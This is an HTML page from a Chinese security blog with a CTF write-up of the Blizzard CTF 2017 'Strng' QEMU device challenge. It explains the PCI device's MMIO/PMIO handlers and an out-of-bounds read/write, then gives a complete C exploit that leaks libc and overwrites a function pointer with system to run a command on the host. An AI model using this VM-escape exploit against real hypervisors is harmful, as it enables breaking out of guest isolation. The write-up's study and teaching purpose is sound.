@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>Q之逃逸-壹之型-Blizzard-CTF-2017-Strng | t1an5t&#39;s Treasure</title>
+  <meta name="keywords" content=" pwnable , qemu ">
+  <meta name="description" content="Q之逃逸-壹之型-Blizzard-CTF-2017-Strng | t1an5t&#39;s Treasure">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
+<meta name="keywords" content="pwnable,qemu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Q之逃逸-贰之型-DefconQuals-2018-EC3">
+<meta property="og:url" content="http://tianstcht.github.io/Q之逃逸-贰之型-DefconQuals-2018-EC3/index.html">
+<meta property="og:site_name" content="t1an5t&#39;s Treasure">
+<meta property="og:description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583376685229.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583377151569.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583377415477.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583377697351.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583391188360.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/EC3.gif">
+<meta property="og:updated_time" content="2020-03-09T14:30:03.997Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Q之逃逸-贰之型-DefconQuals-2018-EC3">
+<meta name="twitter:description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
+<meta name="twitter:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583376685229.png">
+
+<link rel="alternate" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
+
+
+<link rel="icon" href="/img/djcx.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/djcx.jpg" />
+</a>
+<div class="author">
+    <span>t1an5t</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/tianstcht" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1037178204@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1037178204&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(22)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PWN">PWN<small>(7)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="QEMU">QEMU<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="NOTES">NOTES<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="TIPS">TIPS<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="ME">ME<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="22">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://handsomedog.top/">WangTsiAo</a></li>
+            
+            <li><a target="_blank" href="http://http://igml.top/">gml</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">pwnable</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">2019</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">reverse</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">writeup</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">qemu</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">elf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">kernel</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">pwntools</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">glibc</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">tw</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/2019-CISCN-东北赛区线下赛-writeup-PWN/"
+           data-tag="ctf,pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-CISCN-东北赛区线下赛-writeup-PWN">2019-CISCN-东北赛区线下赛-writeup-PWN</span>
+            <span class="post-date" title="2019-06-23 21:13:37">2019/06/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-ByteCTF-writeup-PWN/"
+           data-tag="ctf,pwnable,2019"
+           data-author="" >
+            <span class="post-title" title="2019-ByteCTF-writeup-PWN">2019-ByteCTF-writeup-PWN</span>
+            <span class="post-date" title="2019-09-19 22:33:33">2019/09/19</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-DEFCON-CTF-babyheap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-DEFCON-CTF-babyheap">2019-DEFCON-CTF-babyheap</span>
+            <span class="post-date" title="2020-02-09 11:19:00">2020/02/09</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-realloc_magic/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-realloc_magic">2019-ROAR-CTF-realloc_magic</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-ez_op/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-ez_op">2019-ROAR-CTF-ez_op</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-NEX招新赛-writeup-PWN/"
+           data-tag="ctf,pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-NEX招新赛-writeup-PWN">2019-NEX招新赛-writeup-PWN</span>
+            <span class="post-date" title="2019-10-27 21:52:33">2019/10/27</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2020-网络安全公益赛-writeup-RE/"
+           data-tag="reverse,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-网络安全公益赛-writeup-RE">2020-网络安全公益赛-writeup-RE</span>
+            <span class="post-date" title="2020-02-26 23:01:00">2020/02/26</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-easy_heap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-easy_heap">2019-ROAR-CTF-easy_heap</span>
+            <span class="post-date" title="2020-02-06 10:52:00">2020/02/06</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-叁之型-HITB-CTF-2017-babyqemu/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-叁之型-HITB-CTF-2017-babyqemu">Q之逃逸-叁之型-HITB-CTF-2017-babyqemu</span>
+            <span class="post-date" title="2020-03-05 20:49:00">2020/03/05</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/ELF文件在加载过程中需要关注的部分/"
+           data-tag="elf"
+           data-author="" >
+            <span class="post-title" title="ELF文件在加载过程中需要关注的部分">ELF文件在加载过程中需要关注的部分</span>
+            <span class="post-date" title="2020-02-06 18:01:20">2020/02/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2020-高校战疫-writeup-PWN/"
+           data-tag="pwnable,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-高校战疫-writeup-PWN">2020-高校战疫-writeup-PWN</span>
+            <span class="post-date" title="2020-03-09 22:22:00">2020/03/09</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/KERNEL-CSAW-2010-kernel/"
+           data-tag="pwnable,kernel"
+           data-author="" >
+            <span class="post-title" title="KERNEL-CSAW-2010-kernel">KERNEL-CSAW-2010-kernel</span>
+            <span class="post-date" title="2019-06-20 19:42:11">2019/06/20</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-壹之型-Blizzard-CTF-2017-Strng/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-壹之型-Blizzard-CTF-2017-Strng">Q之逃逸-壹之型-Blizzard-CTF-2017-Strng</span>
+            <span class="post-date" title="2020-03-04 20:19:00">2020/03/04</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-贰之型-DefconQuals-2018-EC3/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-贰之型-DefconQuals-2018-EC3">Q之逃逸-贰之型-DefconQuals-2018-EC3</span>
+            <span class="post-date" title="2020-03-09 22:23:12">2020/03/09</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-零之型-基础知识集合/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-零之型-基础知识集合">Q之逃逸-零之型-基础知识集合</span>
+            <span class="post-date" title="2020-03-04 16:50:00">2020/03/04</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwntools的使用技巧/"
+           data-tag="pwnable,pwntools"
+           data-author="" >
+            <span class="post-title" title="pwntools的使用技巧">pwntools的使用技巧</span>
+            <span class="post-date" title="2019-06-19 15:26:27">2019/06/19</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc-malloc-c源码阅读笔记/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc-malloc.c源码阅读笔记">glibc-malloc.c源码阅读笔记</span>
+            <span class="post-date" title="2019-07-17 16:18:02">2019/07/17</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwn里的一些patch心得/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="pwn里的一些patch心得">pwn里的一些patch心得</span>
+            <span class="post-date" title="2019-06-23 21:13:57">2019/06/23</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/pwnab13-7w/"
+           data-tag="pwnable,tw"
+           data-author="" >
+            <span class="post-title" title="pwnab13.7w">pwnab13.7w</span>
+            <span class="post-date" title="2019-06-19 15:14:30">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/造轮子/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="造轮子">造轮子</span>
+            <span class="post-date" title="2019-06-19 15:40:33">2019/06/19</span>
+        </a>
+        
+        <a  class="ME "
+           href="/t1an5t的2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="t1an5t的2020">t1an5t的2020</span>
+            <span class="post-date" title="1999-01-01 15:13:07">1999/01/01</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc2.30代码阅读/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc2.30代码阅读笔记">glibc2.30代码阅读笔记</span>
+            <span class="post-date" title="2020-02-14 20:26:20">2020/02/14</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Q之逃逸-壹之型-Blizzard-CTF-2017-Strng" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Q之逃逸-壹之型-Blizzard-CTF-2017-Strng</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="QEMU">QEMU</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">pwnable</a>
+            
+            <a class="color5">qemu</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-09 22:29:27'>2020-03-04 20:19</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#初步分析"><span class="toc-text">初步分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深入分析"><span class="toc-text">深入分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><blockquote>
+<p>Username/password: ubuntu/passw0rd</p>
+</blockquote>
+<p>IDA里打开qemu文件，经过长久的等待终于分析完毕。因为launch.sh这个样子：</p>
+<pre><code class="bash">./qemu-system-x86_64 \
+    -m 1G \
+    -device strng \
+    -hda my-disk.img \
+    -hdb my-seed.img \
+    -nographic \
+    -L pc-bios/ \
+    -enable-kvm \
+    -device e1000,netdev=net0 \
+    -netdev user,id=net0,hostfwd=tcp::5555-:22</code></pre>
+<p>根据device参数，知道PCI名字为strng。会搜到这么几个函数：</p>
+<p><img src="/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E5%A3%B9%E4%B9%8B%E5%9E%8B-Blizzard-CTF-2017-Strng/1583313321369.png" alt="1583313321369"></p>
+<p>shift+f1快捷方式可以找到程序中的特有结构体。因为这个题知道源码了hh，所以可以用结构体舒服地反汇编：</p>
+<p><img src="/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E5%A3%B9%E4%B9%8B%E5%9E%8B-Blizzard-CTF-2017-Strng/1583313602953.png" alt="1583313602953"></p>
+<p>pci_strng_realize这里是对PMIO和MMIO函数的注册：</p>
+<p><img src="/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E5%A3%B9%E4%B9%8B%E5%9E%8B-Blizzard-CTF-2017-Strng/1583313654460.png" alt="1583313654460"></p>
+<p>strng_mmio_ops和strng_pmio_ops里面设定了对应函数都是什么，源代码[4]写法是在这样的：</p>
+<pre><code class="c">static const MemoryRegionOps strng_mmio_ops = {
+    .read = strng_mmio_read,
+    .write = strng_mmio_write,
+    .endianness = DEVICE_NATIVE_ENDIAN,
+};
+
+static const MemoryRegionOps strng_pmio_ops = {
+    .read = strng_pmio_read,
+    .write = strng_pmio_write,
+    .endianness = DEVICE_LITTLE_ENDIAN,
+};</code></pre>
+<p>hh怎么感觉还是和内核有共通之处。</p>
+<p>根据两个id：</p>
+<p><img src="/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E5%A3%B9%E4%B9%8B%E5%9E%8B-Blizzard-CTF-2017-Strng/1583314183952.png" alt="1583314183952"></p>
+<p>以及lspci：</p>
+<pre><code class="bash">ubuntu@ubuntu:~$ lspci
+00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
+00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
+00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
+00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
+00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
+00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
+00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</code></pre>
+<p>可以知道：<code>00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</code>这个就是strng设备。</p>
+<p>之后通过lspci查询到MMIO和PMIO的信息：</p>
+<pre><code class="bash">ubuntu@ubuntu:~$ lspci -v -s 00:03.0
+00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
+    Subsystem: Red Hat, Inc Device 1100
+    Physical Slot: 3
+    Flags: fast devsel
+    Memory at febf1000 (32-bit, non-prefetchable) [size=256]
+    I/O ports at c050 [size=8]</code></pre>
+<p>MMIO地址0xfebf1000, 大小为256。PMIO地址为0xc050，八个端口。</p>
+<p>resource文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）：</p>
+<pre><code class="bash">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
+0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
+0x000000000000c050 0x000000000000c057 0x0000000000040101
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+0x0000000000000000 0x0000000000000000 0x0000000000000000</code></pre>
+<p>其格式为start_addr end_addr flags</p>
+<h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>strng_mmio_read</p>
+<pre><code class="c">uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
+{
+    uint64_t result; // rax
+
+    result = -1LL;
+    if ( size == 4 &amp;&amp; !(addr &amp; 3) )
+        result = opaque-&gt;regs[addr &gt;&gt; 2];
+    return result;
+}</code></pre>
+<p>从内存中读数据。</p>
+<p>strng_mmio_write</p>
+<pre><code class="c">void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+{
+  hwaddr choose; // rsi
+  int v5; // eax
+  int vala; // [rsp+8h] [rbp-30h]
+
+  if ( size == 4 &amp;&amp; !(addr &amp; 3) )
+  {
+    choose = addr &gt;&gt; 2;
+    if ( choose == 1 )
+    {
+      opaque-&gt;regs[1] = (opaque-&gt;rand)(opaque, choose, val);
+    }
+    else if ( choose &lt; 1 )
+    {
+      opaque-&gt;srand(val);
+    }
+    else
+    {
+      if ( choose == 3 )
+      {
+        vala = val;
+        v5 = opaque-&gt;rand_r(&amp;opaque-&gt;regs[2]);
+        LODWORD(val) = vala;
+        opaque-&gt;regs[3] = v5;
+      }
+      opaque-&gt;regs[choose] = val;
+    }
+  }
+}</code></pre>
+<p>根据参数的不同，调用不同的随机函数给内存赋值。</p>
+<p>根据参考资料[1]可知，MMIO里，即使看起来好像越界了，不过实际上一开始就会有内部检测，所以这里没戏。</p>
+<p>strng_pmio_read</p>
+<pre><code class="c">uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
+{
+  uint64_t result; // rax
+  uint32_t v4; // edx
+
+  result = -1LL;
+  if ( size == 4 )
+  {
+    if ( addr )
+    {
+      if ( addr == 4 )
+      {
+        v4 = opaque-&gt;addr;
+        if ( !(v4 &amp; 3) )
+          result = opaque-&gt;regs[v4 &gt;&gt; 2];
+      }
+    }
+    else
+    {
+      result = opaque-&gt;addr;
+    }
+  }
+  return result;
+}</code></pre>
+<p>因为pmio在注册的时候只有八字节空间，所以只有两种情况size=0/4，</p>
+<p>strng_pmio_write</p>
+<pre><code class="c">void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
+{
+  uint32_t v4; // eax
+  __int64 v5; // rax
+
+  if ( size == 4 )
+  {
+    if ( addr )
+    {
+      if ( addr == 4 )
+      {
+        v4 = opaque-&gt;addr;
+        if ( !(v4 &amp; 3) )
+        {
+          v5 = v4 &gt;&gt; 2;
+          if ( v5 == 1 )
+          {
+            opaque-&gt;regs[1] = (opaque-&gt;rand)(opaque, 4LL, val);
+          }
+          else if ( v5 &lt; 1 )
+          {
+            opaque-&gt;srand(val);
+          }
+          else if ( v5 == 3 )
+          {
+            opaque-&gt;regs[3] = (opaque-&gt;rand_r)(&amp;opaque-&gt;regs[2], 4LL, val);
+          }
+          else
+          {
+            opaque-&gt;regs[v5] = val;
+          }
+        }
+      }
+    }
+    else
+    {
+      opaque-&gt;addr = val;
+    }
+  }
+}</code></pre>
+<p>根据参数的不同，调用不同的随机函数给内存赋值。</p>
+<p>这里使用的是<code>opaque-&gt;addr</code>，所以通过对它的构造，就可以实现越界读和越界写。</p>
+<p>来说说strng_mmio_read，strng_mmio_write，strng_pmio_read，strng_pmio_write这四个函数，传进来的参数都是个啥：</p>
+<p>首先第一个参数都是一个STRNGState大结构体，而且是同一个。</p>
+<p>第二个参数addr，相当于对regs数组的偏移值，因为是32位数组，所以必须是4的倍数。</p>
+<p>第三个参数val，很好理解，就是传进来的值了。</p>
+<p>第四个参数size，这个系统自己会根据传入的数据类型自动计算，所以传个uint32_t，size就是4啦。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>exp参考raycp师傅的exp[2]，环境不一样，稍作调整，我这里用来弹计算器了hhh</p>
+<pre><code class="c">#include &lt;assert.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;inttypes.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include&lt;sys/io.h&gt;
+
+unsigned char* mmio_mem;
+uint32_t pmio_base = 0xc050;
+
+void die(const char* msg)
+{
+    perror(msg);
+    exit(-1);
+}
+
+void mmio_write(uint32_t addr, uint32_t value)
+{
+    *((uint32_t*)(mmio_mem + addr)) = value;
+}
+
+uint32_t mmio_read(uint32_t addr)
+{
+    return *((uint32_t*)(mmio_mem + addr));
+}
+
+uint32_t pmio_write(uint32_t addr, uint32_t value)
+{
+    outl(value,addr);
+}
+
+uint32_t pmio_read(uint32_t addr)
+{
+    return (uint32_t)inl(addr);
+}
+
+uint32_t pmio_arbread(uint32_t offset)
+{
+    pmio_write(pmio_base+0,offset);
+    return pmio_read(pmio_base+4);
+}
+
+void pmio_abwrite(uint32_t offset, uint32_t value)
+{
+    pmio_write(pmio_base+0,offset);
+    pmio_write(pmio_base+4,value);
+}
+
+int main(int argc, char *argv[])
+{
+
+    // Open and map I/O memory for the strng device
+    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;, O_RDWR | O_SYNC);
+    if (mmio_fd == -1)
+        die(&quot;mmio_fd open failed&quot;);
+
+    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED)
+        die(&quot;mmap mmio_mem failed&quot;);
+
+    printf(&quot;mmio_mem: %p\n&quot;, mmio_mem);
+
+    mmio_write(12,0x63);
+
+    // Open and map I/O memory for the strng device
+    if (iopl(3) !=0 )
+        die(&quot;I/O permission is not enough&quot;);
+
+    // leaking libc address 
+    uint64_t srandom_addr=pmio_arbread(0x108);
+    srandom_addr = srandom_addr&lt;&lt;32;
+    srandom_addr += pmio_arbread(0x104);
+    uint64_t libc_base= srandom_addr - 0x3a8d0;
+    uint64_t system_addr= libc_base + 0x45390;
+    printf(&quot;leaking srandom addr: 0x%llx\n&quot;,srandom_addr);
+    printf(&quot;libc base: 0x%llx\n&quot;,libc_base);
+    printf(&quot;system addr: 0x%llx\n&quot;,system_addr);
+
+    // overwrite rand_r pointer to system
+    pmio_abwrite(0x114,system_addr&amp;0xffffffff);
+    mmio_write(8,0x6c616378);
+
+    // system(&quot;xcalc&quot;)
+    mmio_write(0xc,0);
+
+}   </code></pre>
+<p>妈妈我也会弹计算器啦：</p>
+<p><img src="/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E5%A3%B9%E4%B9%8B%E5%9E%8B-Blizzard-CTF-2017-Strng/strng.gif" alt="strng"></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>算是入手qemu的第一题，最后一步步调出来还是很有成就感的。</p>
+<p>感觉相比于kernel pwn要简单，无论是搭建环境还是理解交互来说，虽然kernel的知识我都忘得差不多啦hhh。</p>
+<p>学到了不少知识，有了点自己的心得了XD。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html</a></p>
+<p>[2] <a href="https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/BlizzardCTF2017-Strng/exp.c" target="_blank" rel="noopener">https://github.com/ray-cp/vm-escape/blob/master/qemu-escape/BlizzardCTF2017-Strng/exp.c</a></p>
+<p>[3] <a href="https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup#strng_mmio_read" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup#strng_mmio_read</a></p>
+<p>[4] <a href="https://github.com/rcvalle/blizzardctf2017" target="_blank" rel="noopener">https://github.com/rcvalle/blizzardctf2017</a></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1037178204@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Q之逃逸-壹之型-Blizzard-CTF-2017-Strng</p>
+    
